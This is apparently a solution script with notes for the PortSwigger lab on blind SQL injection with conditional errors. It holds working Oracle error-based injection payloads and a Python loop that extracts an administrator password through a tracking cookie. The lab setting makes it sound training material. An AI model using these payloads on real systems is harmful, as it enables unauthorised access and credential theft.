#https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors
#Lab: Blind SQL injection with conditional errors

import sys
import requests
import urllib3
import urllib.parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'http': 'https://127.0.0.1:8080'}


def sqli_password(url):
    password_extracted = ""
    for i in range(1,21):
        for j in range(32,126):
            sqli_payload = "' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and ascii(substr(password,%s,1))='%s') || '" % (i,j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {'TrackingId': 'ZtnGEEW1XoNZT0Hh' + sqli_payload_encoded, 'session': 'RmFB2eZtvUxEETZyQ3mlOOivMVjAPwlA'}
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if r.status_code == 500:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' "Your Password is : " + password_extracted + chr(j))
                sys.stdout.flush()

def main():
    if len(sys.argv) !=2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(+) Retreiving administrator password...")
    sqli_password(url)


if __name__ == "__main__":
    main()




#Lab #12 - Blind SQL injection with conditional errors

#Vulnerable parameter - tracking cookie

#End Goals:
#- Output the administrator password
#- Login as the administrator user

#Analysis:

#1) Prove that parameter is vulnerable

#' || (select '' from dual) || ' -> oracle database

#' || (select '' from dualfiewjfow) || ' -> error

#2) Confirm that the users table exists in the database

#' || (select '' from users where rownum =1) || ' 
#-> users table exists

#3) Confirm that the administrator user exists in the users table
#' || (select '' from users where username='administrator') || ' 


#' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || ' 

#' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') || ' 
#-> Internal server error -> administrator user exists

#' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='fwefwoeijfewow') || ' 
#-> 200 response -> user does not exist in database

#4) Determine length of password

#' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>19) || ' 
#-> 200 response at 50 -> length of password is less than 50
#-> 20 characters

#5) Output the administrator password

#' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password,,1)='a') || ' 
#-> w is not the first character of the password

#wjuc497wl6szhbtf0cbf


#script.py <url>